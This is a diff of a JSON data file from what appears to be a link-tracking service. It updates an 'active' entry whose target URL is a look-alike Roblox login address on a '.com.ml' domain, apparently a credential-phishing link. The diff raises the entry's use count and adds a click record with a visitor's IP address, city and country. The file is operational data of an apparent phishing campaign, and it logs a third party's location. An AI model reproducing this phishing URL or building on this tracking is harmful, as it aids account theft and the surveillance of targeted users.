@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 386,
+    "useCount": 387,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3200,6 +3200,14 @@
         "city": "Talavera",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777040851369,
+        "ip": "66.163.126.19",
+        "country": "United States",
+        "city": "Los Angeles",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
